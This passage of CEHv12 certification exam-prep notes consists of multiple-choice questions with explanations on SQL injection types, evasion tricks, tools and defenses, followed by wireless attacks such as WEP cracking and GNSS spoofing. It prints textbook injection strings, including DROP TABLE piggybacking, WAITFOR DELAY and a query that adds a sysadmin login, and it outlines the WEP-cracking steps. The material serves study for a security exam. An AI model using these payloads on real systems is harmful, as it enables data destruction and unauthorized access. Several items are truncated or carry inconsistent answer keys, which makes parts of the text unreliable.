> + For Deleting a Table,he shall use : `blah'; DROP TABLE Creditcard; --`

1077. Identify the reason why Web Applications are vulnerable to SQL injection attacks.
+ [x] Error messages reveal important information
+ [ ] Avoid constructing dynamic SQL with concatenated input values.
+ [ ] Reject entries that contain binary data, escape sequences, and comment characters.
+ [ ] Tests the content of string variables and accepts only expected values.
> **Explanation:**
> + Error messages reveal important information: If the input provided by the user does not exist or the structure of the query is wrong, the database server displays an error message. This error message can reveal important information regarding the database, which an attacker can use to gain unauthorized access to the database.
> + B, C, and D are irrelevant in the scenario.


## Types of SQL Injection
1078. In which of the following attacks does an attacker inject an additional malicious query into an original query to make the DBMS execute multiple SQL queries?
+ [ ] Illegal/logically incorrect query
+ [x] Piggybacked query
+ [ ] Tautology
+ [ ] System stored procedure
> **Explanation:**
> + **Piggybacked Query**: In a piggybacked SQL injection attack, an attacker injects an additional malicious query into the original query. This type of injection is generally performed on batched SQL queries.
> + Illegal/Logically Incorrect Query: Attackers send an incorrect query to the database intentionally to generate an error message that may be helpful in performing further attacks.
> + System Stored Procedure: An attacker may use malicious inputs to execute the malicious SQL statements in the stored procedure. Attackers exploit databases’ stored procedures to perpetrate their attacks.
> + Tautology: In a tautology-based SQL injection attack, an attacker uses a conditional OR clause such that the condition of the WHERE clause will always be true. Such an attack can be used to bypass user authentication.

1079. What is the main difference between a “Normal” SQL injection and a “Blind” SQL injection vulnerability?
+ [ ] The request to the webserver is not visible to the administrator of the vulnerable application.
+ [x] The vulnerable application does not display errors with information about the injection results to the attacker.
+ [ ] The attack is called “Blind” because, although the application properly filters user input, it is still vulnerable to code injection.
+ [ ] A successful attack does not show an error message to the administrator of the affected application.
> **Explanation:**
> In a blind SQL injection, an attacker poses a true or false question to the database to see if the application is vulnerable to SQL injections. A normal SQL injection attack is often possible when a developer uses generic error messages whenever an error occurs in the database. This generic message may reveal sensitive information or give a path to the attacker to carry out an SQL injection attack on the application. However, when developers turn off the generic error message for the application, it is quite difficult for the attacker to perform an SQL injection attack. However, it is not impossible to exploit such an application with an SQL injection attack. Blind injection differs from a normal SQL injection in the way it retrieves data from the database. Blind SQL injection is used either to access sensitive data or to destroy the data. Attackers can steal the data by asking a series of true or false questions through SQL statements. The results of the injection are not visible to the attacker. This process consumes more time as the database generates a new statement for each newly recovered bit.

1080. Steve works as a penetration tester in a firm named InfoSecurity. Recently, Steve was given an assignment to test the security of the company’s web applications and backend database. While conducting the test, he sends a malicious SQL query with conditional timing delays to the backend database through the web application. This conditional time delay forces the database to wait for a specified amount of time before responding. He performs the same task using different malicious SQL queries. By observing various query responses from the database, Steve came to know that the web application is vulnerable to an SQL injection attack.  
	What type of SQL injection attack is Steve most likely performing?
+ [ ] Error-based SQL injection
+ [ ] Out-of-band SQL Injection
+ [ ] Union-based SQL injection
+ [x] Blind SQL injection
> **Explanation:**
> + **Blind SQL injection**: In this attack, the attacker simply asks a series of false or true questions by sending a malicious SQL query to the database. It is time consuming because a new statement needs to be crafted for each bit recovered. Based on the response, the attacker determines whether the web application is vulnerable to SQL injection attack or not.
> + Error-based SQL injection: In this attack, the attacker obtains information about the database by analyzing the error messages obtained from the underlying database.
> + Union-based SQL injection: In this attack, the attacker uses the UNION SQL operator to combine two or more malicious queries into a single statement. This allows the attacker to get a single result containing responses from all the malicious queries.
> + Out-of-band SQL injection: In this attack, the attacker uses the enabled feature of the database server to launch an attack. This is an alternative to time-based blind injection attack.

1081. Select all correct answers.
	In blind SQLi, attackers can steal data by asking a series of true or false questions through SQL statements. Select all the correct types of blind SQL injections.
+ [ ] Tautology
+ [x] Boolean exploitation
+ [x] Time delay
+ [ ] System-stored procedure
> **Explanation:**
> Unlike an error-based SQL injection, a blind SQL injection is used when a web application is vulnerable to an SQL injection, but the results of the injection are not visible to the attacker. Both (a) and (b) are types of Blind SQLi. However, (c) and (d) are types of error-based SQL injections.

1082. In which of the following attacks does an attacker use the same communication channel to perform the attack and retrieve the results?
+ [ ] Inferential SQL injection
+ [ ] Blind SQL injection
+ [x] In-band SQL injection
+ [ ] Out-of-band SQL injection
> **Explanation:**
> + Blind/inferential SQL Injection: In a blind/inferential injection, the attacker has no error messages from the system with which to work. Instead, the attacker simply sends a malicious SQL query to the database.
> + Out-of-band SQL injection: Attackers use different communication channels (such as database e-mail functionality, or file writing and loading functions) to perform the attack and obtain the results.
> + **In-band SQL injection**: An attacker uses the same communication channel to perform the attack and retrieve the results.

1083. In which of the following attacks does an attacker use a conditional OR clause in such a way that the condition of the WHERE clause will always be true?
+ [ ] End-of-line comment
+ [x] Tautology
+ [ ] Illegal/logically incorrect query
+ [ ] UNION SQL injection
> **Explanation:**
> + In a UNION SQL injection, an attacker uses a UNION clause to append a malicious query to the requested query.
> + An attacker may gain knowledge by injecting illegal/logically incorrect requests such as injectable parameters, data types, names of tables, and so on.
> + In a tautology-based SQL injection attack, an attacker uses a conditional OR clause in such a way that the condition of the WHERE clause will always be true.
> + In end-of-line SQL injection, an attacker uses Line comments in specific SQL injection inputs.

1084. In which of the following attacks does an attacker inject an additional malicious query to the original query?
+ [ ] Tautology
+ [ ] UNION SQL injection
+ [ ] In-line comment
+ [x] Piggybacked query
> **Explanation:**
> + Attackers simplify an SQL injection attack by integrating multiple vulnerable inputs into a single query using in-line comments.
> 
> + In a Piggybacked SQL injection attack, an attacker injects an additional malicious query to the original query. The original query remains unmodified, and the attacker’s query is piggybacked on the original query.
> 	+ For example, the original SQL query is as given below.
> 	SELECT * FROM EMP WHERE EMP.EID = 1001 AND EMP.ENAME = ’Bob’
> 	+ Now, the attacker concatenates the delimiter (;) and malicious query to the original query as given below.
> 		```
> 		SELECT * FROM EMP WHERE EMP.EID = 1001 AND EMP.ENAME = ’Bob’;
> 		DROP TABLE DEPT;
> 		```
> 
> + After executing the first query and returning the resultant database rows, the DBMS recognizes the delimiter and executes the injected malicious query. Consequently, the DBMS drops the table DEPT from the database.
> 
> + In a tautology-based SQL injection attack, an attacker uses a conditional OR clause in such a way that the condition of the WHERE clause will always be true.
> 
> + In a UNION SQL injection, an attacker uses a UNION clause to append a malicious query to the requested query.

1085. Which of the following attacks is time-intensive because the database should generate a new statement for each newly recovered bit?
+ [ ] Error-based SQL injection
+ [ ] In-band SQL injection
+ [x] Blind SQL injection
+ [ ] UNION SQL injection
> **Explanation:**
> A Blind/Inferential SQL Injection attack can become time-intensive because the database should generate a new statement for each newly recovered bit.Blind SQL Injection is used when a web application is vulnerable to an SQL injection but the results of the injection are not visible to the attacker. Blind SQL injection is identical to a normal SQL Injection except that when an attacker attempts to exploit an application rather than seeing a useful error message, a generic custom page is displayed. In blind SQL injection, an attacker poses a true or false question to the database to see if the application is vulnerable to SQL injection.

1086. Which of the following commands is used to make the CPU wait for a specified amount of time before executing an SQL query?
+ [ ] `ORDER BY 10--`
+ [ ] `UNION SELECT 1,null,null—`
+ [x] `WAITFOR DELAY '0:0:10'--`
+ [ ] `GET_HOST_NAME()`
> **Explanation:**
> Time Delay SQL injection (sometimes called Time-based SQL injection) evaluates the time delay that occurs in response to true or false queries sent to the database. A waitfor statement stops SQL Server for a specific amount of time. Based on the response, an attacker will extract information such as connection time to the database made as the system administrator or as other users and launch further attacks.
> + `WAIT FOR DELAY 'time' (Seconds)`
> + This is just like sleep; wait for a specified time. The CPU is a safe way to make a database wait.
> + `WAITFOR DELAY '0:0:10'-`

1087. Which of the following SQL queries is an example of a heavy query used in SQL injection?
+ [ ] `SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`
+ [x] `SELECT * FROM products WHERE id=1 AND 1 < SELECT count(*) FROM all_users A, all_users B, all_users C`
+ [ ] `SELECT * FROM products WHERE id_product=$id_product`
+ [ ] `SELECT Name, Price, Description FROM ITEM_DATA WHERE ITEM_ID = 67 AND 1 = 1`
> **Explanation:**
> + For example, the following is a query in Oracle that takes a huge amount of time to execute: `SELECT count(*) FROM all_users A, all_users B, all_users C`
> 
> + If an attacker injects a malicious parameter to the above query to perform a time-based SQL injection without using functions, then it takes the following form: `1 AND 1 < SELECT count(*) FROM all_users A, all_users B, all_users C`
> 
> + The final resultant query takes the form: `SELECT * FROM products WHERE id=1 AND 1 < SELECT count(*) FROM all_users A, all_users B, all_users C`

1088. In which of the following attacks does an attacker pose a true or false question to an database to determine whether an application is vulnerable to SQL injection?
+ [ ] Union SQL injection
+ [ ] Error-based SQL injection
+ [x] Blind SQL injection
+ [ ] In-band SQL injection
> **Explanation:**
> + Union SQL Injection: In a UNION SQL injection, an attacker combines a forged query with a query requested by the user using a UNION clause.
> + **Blind/Inferential SQL Injection**: In blind SQL injection, an attacker poses a true or false question to the database to determine whether the application is vulnerable to SQL injection.
> + Error-based SQL injection: In this type of SQL injection, the attacker forces the database to return error messages in response to his/her inputs. Later, the attacker may analyze the error messages obtained from the underlying database to gather information that can be used for constructing the malicious query.
> + In-band SQL injection: In in-band SQL injection, attackers use the same communication channel to perform the attack and retrieve the results.

1089. In one of the following attacks, an attacker uses different communication channels to perform the attack and obtain results. It is difficult to perform as the attacker needs to communicate with a database server and determine the server features used by a web application. Which is this attack?
+ [ ] In-band SQL injection
+ [ ] End-of-line comment
+ [ ] Union SQL injection
+ [x] Out-of-band SQL injection
> **Explanation:**
> + End of Line Comment: In this type of SQL injection, an attacker uses line comments in specific SQL injection inputs. Comments in a line of code are often denoted by (--), and they are ignored by the query.
> + In-Band SQL Injection: In in-band SQL injection, attackers use the same communication channel to perform the attack and retrieve the results.
> + **Out-of-Band SQL injection:** Attackers use different communication channels (such as database email functionality or file writing and loading functions) to perform the attack and obtain the results. This type of attack is difficult to perform because the attacker needs to communicate with the server and determine the features of the database server used by the web application.
> + Union SQL Injection: In a UNION SQL injection, an attacker combines a forged query with a query requested by the user using a UNION clause.

1090. In which of the following attacks does an attacker use an ORDER BY clause to find the right number of columns in a database table?
+ [ ] Piggybacked query
+ [ ] Tautology
+ [x] UNION SQL injection
+ [ ] In-line comments
> **Explanation:**
> In a UNION SQL injection, to find the right numbers of columns, the attacker first launches a query by using an ORDER BY clause, followed by a number to indicate the number of database columns selected: `ORDER BY 10--`


## SQL Injection Methodology, Tools, and Evasion Techniques
1091. Which of the following issues can be detected when testers send long strings of junk data, similar to strings for detecting buffer overruns that throw SQL errors on a page?
+ [ ] Input sanitization
+ [ ] SQL injection
+ [ ] SQL modification
+ [x] Truncation
> **Explanation:**
> + Detecting Input Sanitization: testers use right square bracket (the ] character) as the input data to identify instances where the user input is used as a part of an SQL identifier without any input sanitization.
> + Detecting SQL Modification: Testers send long strings of single quote characters (or right square brackets or double quotes). These max out the return values from REPLACE and QUOTENAME functions and might truncate the command variable used to hold the SQL statement.
> + Detecting SQL Injection Issues: Testers send single quotes as input data to identify instances where the user input is not sanitized. Send double quotes as input data to identify instances where the user input is not sanitized.
> + **Detecting Truncation Issues**: Testers send long strings of junk data, similar to strings to detect buffer overruns; this action might throw SQL errors on the page.

1093. In which of the following techniques does an attacker use logical requests such as AND/OR to bypass a firewall?
+ [ ] HPF technique
+ [x] Blind SQL injection
+ [ ] Normalization method
+ [ ] CRLF technique
> **Explanation:**
> + CRLF Technique: Carriage return, line feed (CRLF) is a pair of ASCII codes, 13 and 10. In Windows, CRLF is used to indicate the end of a line in a text file (\r\n). Macintosh uses CR (\r) alone and UNIX uses LF(\n) alone.
> + HPF Technique: HPF is used along with HPP using the UNION operator to bypass firewalls.
> + Normalization Method: Systematic representation of the database in the normalization process sometimes leads to an SQL injection attack.
> + **Blind SQL Injection**: This technique is used to replace WAF signatures with their synonyms using SQL functions. Attackers use logical requests such as AND/OR to bypass the firewall.

1099. Talisa is inspecting the website Movie Scope for SQL injection attacks. She is using an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and the taking over of database servers. The tool is called sqlmap.
	Talisa was able to find and exploit an SQL injection vulnerability in the user ID parameter on the website. Now she has full control over the DBMS. However, she had to prove to the website owner that she was able to execute SQL commands on the DB server and successfully retrieve answers from the DB prior to getting paid.
	From the screenshot below, identify the SQL command that Talisa used in order to retrieve the DBMS version.
	![](D:\Notes\Certification Cources\EC-Council\CEHv12\Exam-Prep\CEHv12\06.png)
+ [ ] SELECT * FROM VERSION
+ [ ] GET @@VERSION

1100. A tester has been hired to perform source code review of a web application to detect SQL injection vulnerabilities. As part of the testing process, he needs to get all the information about the project from the development team. During the discussion with the development team, he comes to know that the project is in the initial stage of the development cycle. As per the above scenario, which of the following processes does the tester need to follow in order to save the company’s time and money?
+ [x] The tester needs to perform static code analysis as it covers the structural and statement coverage testing
+ [ ] The tester needs to perform dynamic code analysis as it uncovers bugs in the software system
+ [ ] The tester needs to perform dynamic code analysis as it finds and fixes the defects
+ [ ] The tester needs to perform static code analysis as it covers the executable file of the code
> **Explanation:**
> + **The tester needs to perform static code analysis as it covers the structural and statement coverage testing:** The main objective of static code analysis is to improve the quality of software products by finding errors in the early stages of the development cycle. In static testing, code is not executed. It involves manual or automated reviews of the documents. This review is done during the initial phase of the testing to catch defects early in SDLC. It assesses the code and documentation and covers the structural and statement coverage testing.
> + The tester needs to perform static code analysis as it covers the executable file of the code: Static code analysis is performed in early stages of the development cycle. In static testing, code is not executed, so it does not cover the testing of an executable file of the code.
> + The tester needs to perform dynamic code analysis as it uncovers bugs in the software system: Dynamic code analysis checks for functional behavior of the software system, memory/CPU usage, and overall performance of the system. In dynamic testing, code is executed to uncover bugs in the software system. This testing is not performed in the early stages of the development cycle.
> + The tester needs to perform dynamic code analysis as it finds and fixes the defects: Dynamic code analysis finds and fixes the defects, but the cost of finding and fixing defects is high.

1101. Robert, a penetration tester, is trying to perform SQL penetration testing on the SQL database of the company to discover coding errors and security loopholes. Robert sends massive amounts of random data to the SQL database through the web application in order to crash the web application of the company. After observing the changes in the output, he comes to know that the web application is vulnerable to SQL injection attacks. Which of the following testing techniques is Robert using to find out the loopholes?
+ [ ] Alternate Encodings
+ [ ] Out of Band Exploitation
+ [ ] Stored Procedure Injection
+ [x] Fuzzing Testing
> **Explanation:**
> + Stored Procedure Injection: Stored procedures are used at the back end of the web application to support its functionalities. In the stored procedure injection techniques, malicious SQL queries are executed within the stored procedure.
> + Out of Band Exploitation: In the Out of Band exploitation technique, the tester creates an alternate channel to retrieve data from the server.
> + Alternate Encodings: In the alternate encodings technique, the tester modifies the SQL injection query by using alternate encoding, such as hexadecimal, ASCII, and Unicode.
> + **Fuzzing Testing:** Fuzz testing (fuzzing) is a black box testing method. It is a quality checking and assurance technique used to identify coding errors and security loopholes in web applications.Huge amounts of random data called ‘Fuzz’ will be generated by the fuzz testing tools (Fuzzers) and used against the target web application to discover vulnerabilities that can be exploited by various attacks.

1102. In which of the following evasion techniques does an attacker use a WHERE statement that is always evaluated as “true” so that any mathematical or string comparison can be used, such as “' or '1'='1'”?
+ [ ] Case variation
+ [x] Variations
+ [ ] Declare variables
+ [ ] Null byte
> **Explanation:**
> + **Variations**: Uses the WHERE statement that always evaluates to 'true,' so that any mathematical or string comparison can be used. It is performed by placing characters such as “' or '1'='1'” on any basic injection statement such as“or 1=1” or with other accepted SQL comments.
> + Declare Variables: Uses variables that can be used to pass a series of specially crafted SQL statements and bypass the detection mechanism.
> + Case Variation: Obfuscate an SQL statement by mixing it with uppercase and lowercase letters.
> + Null Byte: Uses the null byte (%00) character prior to a string in order to bypass the detection mechanism.

1103. Which of the following characters is used in an SQL injection query as a wildcard attribute indicator?
+ [ ] `/*…*/`
+ [ ] `' or "`
+ [ ] `#`
+ [x] `%`
> **Explanation:**
> The various SQL injection characters are as follows:
> + ' or " character string indicators
> + -- or # single-line comment
> + /*…*/ multiple-line comment
> + + addition, concatenate (or space in URL)
> + || (double pipe) concatenate
> + **% wildcard attribute indicator**
> + ?Param1=foo&Param2=bar URL Parameters
> + PRINT useful as non-transactional command

1104. Fill in the blank:
	______ function is an IDS evasion technique that can be used to inject SQL statements into MySQL database without using double quotes.
+ [ ] CHR()
+ [x] CHAR()
+ [ ] CONV()
+ [ ] ASCIISTR()
> **Explanation:**
> + With the char() function, an attacker can encode a common injection variable present in the input string in an attempt to avoid detection in the signatures of network security measures. This char() function converts hexadecimal and decimal values into characters that can easily pass through SQL engine parsing.

1105. Williams, a professional hacker, targeted a web application that uses a MongoDB backend database. He employed MongoDB operations such as $eq to create a malicious command using which he could bypass the authentication process and exfiltrate the customers’ data stored in the database.
	Which of the following attacks did Williams perform in the above scenario?
+ [ ] Command injection
+ [x] NoSQL injection
+ [ ] LDAP injection
+ [ ] Smurf attack
> **Explanation:**
> + **NoSQL Injection Attack:** MongoDB uses a NoSQL database, which is vulnerable to various NoSQL injection attacks. The web applications that use a MongoDB database may contain this vulnerability in its authentication code, which allows attackers to bypass the authentication process. It can further lead to data exfiltration and data modification. Applications developed using PHP, JavaScript, Python, and Java allow attackers to execute commands in the database as well as in the application. Attackers use MongoDB operations such as **$eq** (equals), **$ne** (not equal to), **$gt** (greater than), **$gte** (greater than or equal to), and **[$regex]** to create a malicious command that bypasses the authentication procedure.
> 
> + Command Injection: An Attackers identify an input validation flaw in an application and exploit the vulnerability by injecting a malicious command in the application to execute supplied arbitrary commands on the host operating system. Thus, such flaws are extremely dangerous.
> 
> + LDAP Injection: LDAP injection is an attack method in which websites that construct LDAP statements from user-supplied input are exploited for launching attacks. When an application fails to sanitize the user input, the attacker modifies the LDAP statement with the help of a local proxy. This, in turn, results in the execution of arbitrary commands such as granting access to unauthorized queries and altering the content inside the LDAP tree.
> 
> + Smurf Attack: In a Smurf attack, the attacker spoofs the source IP address with the victim’s IP address and sends a large number of ICMP ECHO request packets to an IP broadcast network. This causes all the hosts on the broadcast network to respond to the received ICMP ECHO requests.

1106. In one of the following methods, an attacker attempts to replicate error-free navigation by injecting simple inputs such as **' and '1' = '1 Or ' and '1' = '2** and forces an application to generate application errors that reveal information such as table names, column names, and data types. Which is this method?
+ [ ] Type mismatch
+ [ ] Determining the database engine type
+ [ ] Parameter tampering
+ [x] Determining a SELECT query structure
> **Explanation:**
> + **Determining a SELECT Query Structure**: Using which, attackers try to replicate an error free navigation by the injection of simple input such as ' and '1' = '1 Or' and '1' = '2 . To obtain the original query structure, the attacker forces the application to generate application errors that reveal information such as table names, column names, and data types.
> + Determining Database Engine Type: Determining the database engine type is fundamental to proceeding with the injection attack. ODBC error messages reveal the type of database engine used or enable an attacker to guess and determine which type of database engine might have been used in the application.
> + Parameter Tampering: An attacker can tamper with HTTP GET and POST requests to generate errors. The Burp Suite or Tamper Chrome utilities can manipulate GET and POST requests.
> + Type Mismatch: Attackers try to insert strings into numeric fields; the error messages will show the data that could not get converted.

1107. In which of the following database technologies is the SQL query **[SELECT * FROM syscat.columns WHERE tabname= 'tablename']** used for column enumeration?
+ [ ] Oracle

1109. Shea is a licensed penetration tester. She is working with a client to test their new e-commerce website for SQL injection. After signing the NDA and agreeing on the rules of engagement (RoE), she starts by examining and listing all the input fields on the website. She tries to insert a string value in the CVV2 textbox, where a three-digit number is expected, and she ends up with the below error message.
	![](D:\Notes\Certification Cources\EC-Council\CEHv12\Exam-Prep\CEHv12\07.png)
	Identify in which stage of the SQL injection methodology is Shea right now.
+ [ ] Perform blind SQL injection
+ [x] Information gathering and SQL injection vulnerability detection
+ [ ] Exploit second-order SQL injection
+ [ ] Launch SQL injection attacks
> **Explanation:**
> + The SQL injection methodology consists of three stages:  
> 	1. Information gathering and SQL injection vulnerability detection,  
> 	2. launch SQL injection attacks, and  
> 	3. advanced SQL injection.
> + In the information gathering stage, attackers try to gather information about the target database such as database name, version, users, output mechanism, DB type, user privilege level, and OS interaction level. Once the information is gathered, the attacker then tries to look for SQL vulnerabilities in the target web application. For that, the attacker lists all input fields and hidden fields, and posts requests on the website and then tries to inject code into the input fields to generate an error. The attacker then tries to carry out different types of SQL injection attacks such as error-based SQL injection, union-based SQL injection, blind SQL injection, and so on.
> + Shea is currently at the information gathering and SQL injection vulnerability detection stage.
> + (c) and (d) are wrong because these are the specific tasks that is performed in second stage (launch SQL injection attacks).

1110. David, a penetration tester, was asked to check the MySQL database of the company for SQL injection attacks. He decided to check the back end database for a double blind SQL injection attack. He knows that double blind SQL injection exploitation is performed based on an analysis of time delays and he needs to use some functions to process the time delays. David wanted to use a function which does not use the processor resources of the server. Which of the following function David need to use?
+ [x] sleep()
+ [ ] addcslashes()
+ [ ] mysql_query()
+ [ ] benchmark()
> **Explanation:**
> + **sleep():** This function does not use processor resources of the server. Function sleep() represents an analogue of function benchmark(). Function sleep() is more secure in the given context, because it does not use server resources.
> + benchmark(): This function uses the processor resources of the server.
> + mysql_query(): This function does not permit query stacking or executing multiple queries in a single function call.
> + addcslashes(): This function allows the tester to specify a character range to escape.

1111. Which of the following tools does an attacker use to perform SQL injection exploitation through techniques such as union and blind SQL exploitation and bypass certain IPS/IDS rules with generic filters?
+ [x] Mole
+ [ ] Astra
+ [ ] China Chopper
+ [ ] Weevely
> **Explanation:**
> + China Chopper: China Chopper is a simple backdoor in terms of components. It has two key components, the Web shell command-and-control (CnC) client binary and a text-based Web shell payload (server component).
> + **Mole:** Mole is an automatic SQL injection exploitation tool. Only by providing a vulnerable URL and a valid string on the site, it can detect the injection and exploit it using the union technique or a Boolean query-based technique.
> + Weevely: Attackers use Weevely to develop a backdoor shell and upload it to a target server to gain remote shell access. This tool also helps attackers in performing administrative tasks, maintaining persistence, and spreading backdoors across the target network.
> + Astra: Attackers use the Astra tool to detect and exploit underlying vulnerabilities in a REST API.

1112. William has been hired by the ITSec, Inc. to perform web application security testing. He was asked to perform black box penetration testing to test the security of the company’s web applications. No information is provided to William about the company’s network and infrastructure. William notices that the company website is dynamic and must make use of a backend database. He wants to see if an SQL injection would be possible. As part of the testing, he tries to catch instances where the user input is used as part of an SQL identifier without any input sanitization. Which of the following characters should William use as the input data to catch the above instances?
+ [x] Single quote
+ [ ] Right square bracket
+ [ ] Semicolon
+ [x] Double quote
> **Explanation:**
> + Single and double quotes: In black box penetration testing, single and double quotes are used as the input data to catch instances where the user input is not sanitized.
> + Semicolon: In black box penetration testing, a semicolon is used to group two or more SQL statements in the same line.

1113. Which of the following queries is used to create a database account in Microsoft SQL Server?
+ [ ] `INSERT INTO mysql.user (user, host, password) VALUES ('victor', 'localhost', PASSWORD('Pass123'))`

+ [x] `exec sp_addlogin 'victor', 'Pass123' exec sp_addsrvrolemember 'victor', 'sysadmin'`
+ [ ] `CREATE USER victor IDENTIFIED BY 'Pass123'`
> **Explanation:**
> The following are different ways of creating database accounts in various DBMS:
> **Oracle**
> ```
> CREATE USER victor IDENTIFIED BY Pass123
> TEMPORARY TABLESPACE temp
> DEFAULT TABLESPACE users;
> GRANT CONNECT TO victor;

1115. In one of the following defensive techniques, only the list of entities such as data type, range, size, and value that have been approved for secured access are accepted. Which is this technique?
+ [x] Whitelist validation
+ [ ] Blacklist validation
+ [ ] Output encoding
+ [ ] Enforcing least privileges
> **Explanation:**
> + Output Encoding: Output encoding is used to encode the input to ensure it is properly sanitized before being passed to the database.
> + **Whitelist Validation**: Whitelist validation is a best practice whereby only the list of entities (i.e., data type, range, size, value, etc.) that have been approved for secured access is accepted. Whitelist validation can also be termed as positive validation or inclusion.
> + Enforcing Least Privileges: Minimum privileges should be assigned to the operating system where the database management system runs, and the DBMS should never be run as root.
> + Blacklist Validation: Blacklist validation rejects all the malicious inputs that have been disapproved for protected access.

1147. Which of the following consists of 40/104 bit Encryption Key Length?
+ [ ] WPA2
+ [ ] WPA
+ [x] WEP
+ [ ] RSA
> **Explanation:**

> 	+ 128-bit WEP uses a 104-bit key size
> 	+ 256-bit WEP uses 232-bit key size
> + WEP normally uses a 40-bit or 104-bit encryption key, whereas TKIP in WPAuses 128-bit keys for each packet. The message integrity check for WPA avoids the chances of the attacker changing or resending the packets.
> + WP2 uses AES-CCMP encryption using 128 bit keys.

1148. Which of the following includes mandatory support for Counter Mode with Cipher Block Chaining Message Authentication Code Protocol (CCMP)?
+ [ ] TKIP
+ [ ] WEP
+ [ ] WPA
+ [x] WPA2
> **Explanation:**
> + WPA2 (Wi-Fi Protected Access 2) Encryption: WPA2 (Wi-Fi Protected Access 2) is a security protocol used to safeguard the wireless networks and has replaced WPA technology in 2006. It is compatible with the 802.11i standard and supports many security features that WPA does not support. WPA2 introduces the use of the National Institute of Standards and Technology (NIST) FIPS 140-2-compliant AES encryption algorithm, a strong wireless encryption, and Counter Mode Cipher Block Chaining Message Authentication Code Protocol (CCMP). It provides stronger data protection and network access control. It gives a high level of security to Wi-Fi connections, so that only authorized users can access it.
> + WPA has better data encryption security than WEP, as messages pass through a Message Integrity Check (MIC) using the Temporal Key Integrity Protocol (TKIP). It uses a Temporal Key Integrity Protocol (TKIP) that utilizes the RC4 stream cipher encryption with 128-bit keys and 64-bit MIC integrity check to provide stronger encryption, and authentication.
> + WEP utilizes an encryption mechanism at the data link layer for minimizing unauthorized access on the WLAN. This is accomplished by encrypting data with the symmetric RC4 encryption algorithm—a cryptographic mechanism used to defend against threats.

+ [x] Ad hoc association
> **Explanation:**
> + **Ad hoc associations**: An attacker may perform this kind of attack using any Universal Serial Bus (USB) adapter or wireless card. The attacker connects the host to an unsecured client to attack a specific client or to avoid AP security.
> + Promiscuous client: Promiscuous clients allow an attacker to transmit target network traffic through a fake AP. It is very similar to the evil-twin threat on wireless networks, in which an attacker launches an AP that poses as an authorized AP by beaconing the WLAN's SSID.
> + Client mis-association: The client may intentionally or accidentally connect or associate with an AP outside the legitimate network because the WLAN signals travel through the air, walls, and other obstructions.
> + Unauthorized association: Unauthorized association is a major threat to wireless networks. The prevention of this kind of attack depends on the method or technique that the attacker uses to get associated with a network.

1157. Which of the following attacks is an inter-chip privilege escalation attack, where an attacker exploits the underlying vulnerabilities in wireless chips that handle wireless communications such as Bluetooth and Wi-Fi?
+ [ ] aLTEr attack
+ [x] Wireless co-existence attack
+ [ ] Evil twin
+ [ ] AP MAC spoofing
> **Explanation:**
> + **Wireless Co-Existence Attack:** An inter-chip privilege escalation attack exploits the underlying vulnerabilities in wireless chips that handle wireless communications such as Bluetooth and Wi-Fi. Manufacturers often design separate chips for Bluetooth and Wi-Fi. Alternatively, they design a combo chip for both types of wireless communications. Attackers leverage combo chips to exploit one chip to steal the data from another chip and make lateral moves to exploit other chips. For example, while sharing resources, a Bluetooth chip can directly capture credentials or other sensitive data from the Wi-Fi chip, or it can manipulate the traffic going through the Wi-Fi chip. This can cause a wireless co-existence attack, which may lead to privilege escalation at chip boundaries.
> + AP MAC Spoofing: An attacker can spoof the MAC address of the AP by programming a rogue AP to advertise the same identity information as that of the legitimate AP. An attacker connected to the AP as an authorized client can have full access to the network..
> + Evil Twin: An evil twin is a wireless AP that pretends to be a legitimate AP by imitating its SSID. It poses a clear and present danger to wireless users on private and public WLANs. An attacker sets up a rogue AP outside the network perimeter and lures users to sign into this AP.
> + aLTEr Attack: The aLTEr attack is usually performed on LTE devices that encrypt user data in the AES counter (AES-CTR) mode, which provides no integrity protection.

1158. In a GNSS spoofing technique, attackers track the receiver’s position and identify the deviation from the original location to a fake one. Identify this technique.
+ [ ] Meaconing method
+ [x] Drag-off strategy
+ [ ] Interrupting the lock mechanism
+ [ ] Cancellation methodology
> **Explanation:**
> + Cancellation Methodology: Attackers use dual signal transmission to cancel out individual spoofed signals by introducing false satellite data. The targeted signals are initially spoofed, where the latter is added with a false component that deceives the targeted GNSS receiver. This method is beneficial to the attacker in terms of extracting the code phase data but limited in terms of obtaining the amplitude matching and carrier phase.
> + Meaconing Method: Attackers aim to block and re-broadcast the original signals for masking the actual signal toward the targeted receiver. This attack is effective with mono- and multi-antenna meaconers that control multiple satellites and allows attackers to manipulate the original signal with false positioning data and delay timings. Attackers prefer this method when it is impossible for a spoofer to generate a spreading sequence.
> + **Drag-off Strategy:** Attackers track the receiver’s position and identify the deviation from the original location to a fake one. Attackers initiate this technique by mirroring the original navigation signals, injecting a progressive misalignment between those signals, and forwarding them to the GNSS receiver. The drag-off strategy is an effective attack that protects attackers from detection by radar systems.
> + Interrupting the Lock Mechanism: Attackers aim to discover a GNSS receiver’s new lock via a faulty signal. Attackers initiate this process by radiating a jamming signal inside the GNSS receiver, where the receiver requests for the next acquisition. Then, a signal simulator is used to generate a false signal, transmit it to the GNSS targeted receiver, and gain the new lock data of the receiver.

1163. There is a WEP encrypted wireless AP with no clients connected. In order to crack the WEP key, a fake authentication needs to be performed. Which of the following steps need to be performed by the attacker for generating fake authentication?
+ [ ] Set the wireless interface to monitor mode
+ [ ] Capture the IVs
+ [x] Ensure association of source MAC address with the AP
+ [ ] Use cracking tools
> **Explanation:**
> To break WEP encryption the attacker follows these steps:
> + Start the wireless interface in monitor mode on the specific AP channel
> 
> 	In this step, the attacker sets the wireless interface to monitor mode. The interface can listen to every packet in the air. The attacker can select some packets for injection by listening to every packet available in the air.
> 
> + Test the injection capability of the wireless device to the AP
> 
> 	The attacker tests whether the wireless interface is within the range of the specified AP and whether it is capable of injecting packets to it.
> 
> + Use a tool such as aireplay-ng to do a fake authentication with the AP
> 
> 	The attacker ensures that the source MAC address is already associated, so that the AP accepts the injected packets. The injection will fail due to the lack of association with the AP.
> 
> + Start the Wi-Fi sniffing tool
> 
> 	The attacker captures the IVs generated by using tools such as Cain & Abel and airodump-ng with a BSSID filter to collect unique IVs.
> 
> + Start a Wi-Fi packet encryption tool such as aireplay-ng in ARP request replay mode to inject packets
> 
> 	To gain a large number of IVs in a short period, the attacker turns the aireplay-ng into ARP request replay mode, which listens for ARP requests and then re-injects them back into the network. The AP usually rebroadcasts packets generating a new IV. So in order to gain a large number of IVs, the attacker selects the ARP request mode.

> 	Using cracking tools such as Cain & Abel or aircrack-ng the attacker can extract WEP encryption keys from the IVs.

